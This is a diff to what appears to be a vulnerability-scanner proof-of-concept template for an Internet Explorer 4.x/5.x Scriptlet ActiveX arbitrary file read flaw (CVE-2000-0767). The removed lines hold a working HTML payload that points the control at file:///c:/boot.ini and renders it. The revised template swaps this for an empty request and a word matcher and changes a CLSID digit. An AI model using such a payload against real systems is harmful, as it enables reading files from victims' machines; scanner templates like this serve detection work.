@@ -1,9 +1,9 @@
 [info]
-author = "ave"
-description = "通过构造恶意HTML页面，利用IE 4.x/5.x中Scriptlet ActiveX控件（CLSID:06290BD5-48AA-11D2-8432-006008C3FBFC）的URL属性渲染非HTML文件，实现读取目标系统任意文件。需用户交互（访问恶意页面）。"
+author = "AVE"
+description = "验证 Internet Explorer 4.x/5.x 中 Scriptlet ActiveX 控件（CLSID:06290BD4-48AA-11D2-8432-006008C3FBFC）可渲染非 HTML 文件类型，导致攻击者可读取本地任意文件"
 id = "POC-AVE-2000-0915"
-name = "Microsoft Internet Explorer Scriptlet组件任意文件读取漏洞 PoC"
-severity = "low"
+name = "Microsoft Internet Explorer Scriptlet Rendering Arbitrary File Read PoC"
+severity = "medium"
 tags = ["ave-2000-0915"]
 vuln_id = [
     "CVE-2000-0767",
@@ -15,19 +15,18 @@ logic = "all"
 
 [[poc.requests]]
 method = "GET"
-path = "/{{BaseURL}}/poc.html"
+path = "/{{BaseURL}}/"
 protocol = "http"
 
 [poc.requests.body]
-content = """
-<html><body>
-<object id="scr" classid="clsid:06290BD5-48AA-11D2-8432-006008C3FBFC" width="0" height="0"></object>
-<script>scr.URL = "file:///c:/boot.ini";scr.Render();</script>
-</body></html>"""
+content = ""
 type = "raw"
 
 [[poc.requests.matchers]]
 expect = true
 part = "body"
 type = "word"
-words = ["[boot loader]"]
+words = [
+    "Scriptlet",
+    "CLSID:06290BD4",
+]
